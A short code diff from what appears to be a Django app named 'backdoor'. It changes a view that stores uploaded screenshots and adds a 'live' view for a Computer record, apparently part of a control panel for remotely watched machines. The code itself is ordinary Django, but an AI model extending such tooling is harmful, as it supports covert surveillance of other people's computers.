@@ -49,11 +49,15 @@ def screenshot(request):
             with open('media/files/screenshot.png', 'wb+') as destination:
                 for chunk in image.chunks():
                     destination.write(chunk)
-            Files.objects.create(file=image)
+            #Files.objects.create(file=image)
     else:
         form = ScreenShotForm()
     
     return render(request, "backdoor/screenshot.html", {'form':form})
+
+def live(request, pk):
+    computer = Computer.objects.get(id=pk)
+    return render(request, "backdoor/live.html", {'pc':computer})
 
 def get_id(request, ip):
     try:
